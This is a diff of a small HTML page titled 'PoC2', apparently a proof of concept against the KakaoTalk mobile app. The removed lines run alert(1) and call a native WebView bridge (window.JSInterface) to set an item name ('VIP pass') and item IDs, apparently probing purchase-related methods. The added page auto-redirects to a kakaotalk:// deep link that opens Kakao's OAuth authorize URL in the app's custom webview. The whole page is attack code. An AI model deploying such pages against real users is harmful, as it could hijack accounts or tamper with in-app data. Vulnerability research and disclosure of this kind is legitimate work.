@@ -1,10 +1,17 @@
-<html>
-<body>
-hi
-</body>
-  <script>
-  alert(1);
-  window.JSInterface.setItemName("VIP 이용권");
-  window.JSInterface.setBtIdList("58546691,57426082");
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>PoC2</title>
+</head>
+<body style="background:#101012;color:#eee;font-family:-apple-system,sans-serif;padding:24px">
+
+<script>
+setTimeout(function () {
+    location.href = 'kakaotalk://pfcustomwebview/open?url=http://kauth.kakao.com/oauth/authorize';
+}, 1500);
 </script>
+
+</body>
 </html>
